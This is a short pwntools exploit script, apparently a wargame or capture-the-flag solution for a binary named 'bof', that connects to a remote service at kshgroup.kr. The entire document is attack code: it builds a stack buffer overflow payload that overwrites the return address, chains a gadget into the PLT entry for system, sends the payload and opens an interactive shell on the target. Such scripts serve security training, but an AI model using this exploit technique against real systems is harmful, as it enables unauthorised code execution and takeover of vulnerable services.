from pwn import *

p = remote('kshgroup.kr', 20201)
#p = process('./bof')
e = ELF('./bof')

context.log_level = "debug"
payload = 'a' * 0x204 + 'b' * 4
payload += p32(0x08048331)
payload += p32(0)
payload += p32(e.plt['system'])
payload += p32(0)
payload += p32(0x804A024)

pause()
p.recv()
p.sendline(payload)

p.interactive()
